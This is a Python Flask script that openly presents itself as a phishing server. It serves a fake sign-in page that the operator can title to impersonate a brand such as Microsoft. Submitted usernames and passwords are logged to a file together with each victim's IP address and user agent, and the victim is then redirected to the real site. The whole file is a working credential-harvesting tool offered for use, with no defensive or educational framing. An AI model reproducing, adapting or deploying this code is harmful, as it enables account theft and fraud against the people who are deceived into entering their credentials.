# language: Python 3, file: phishing_page.py, target: Windows/Linux
# Flask phishing server — serves a fake login page and captures submitted credentials.
# pip install flask
from flask import Flask, request, redirect, render_template_string
import datetime
import os

app = Flask(__name__)
LOG_FILE = 'captured_creds.txt'

LOGIN_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Sign In</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f4f4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:320px}
h2{margin-bottom:20px;text-align:center;color:#333}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:15px}
button:hover{background:#1558b0}
</style>
</head>
<body>
<div class="box">
<h2>{{ site_name }}</h2>
<form method="POST" action="/login">
  <input type="text"     name="username" placeholder="Email or Username" required>
  <input type="password" name="password" placeholder="Password"          required>
  <button type="submit">Sign In</button>
</form>
</div>
</body>
</html>
'''

SITE_NAME = os.environ.get('SITE_NAME', 'Account Login')
REDIRECT_URL = os.environ.get('REDIRECT_URL', 'https://google.com')

@app.route('/')
def index():
    return render_template_string(LOGIN_HTML, site_name=SITE_NAME)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username', '')
    pwd  = request.form.get('password', '')
    ip   = request.remote_addr
    ua   = request.headers.get('User-Agent', '')
    ts   = datetime.datetime.utcnow().isoformat()
    line = f'[{ts}] IP={ip} USER={user} PASS={pwd} UA={ua}\n'
    print(f'[CRED] {line.strip()}')
    with open(LOG_FILE, 'a') as f:
        f.write(line)
    return redirect(REDIRECT_URL)

if __name__ == '__main__':
    port = int(input('Port (ex: 80 or 8080): ').strip())
    site = input('Page title (ex: Microsoft Login): ').strip()
    redir = input('Redirect after submit (ex: https://microsoft.com/login): ').strip()
    SITE_NAME = site or SITE_NAME
    REDIRECT_URL = redir or REDIRECT_URL
    print(f'[*] Phishing server on 0.0.0.0:{port}')
    print(f'[*] Creds saved to {LOG_FILE}')
    app.run(host='0.0.0.0', port=port)
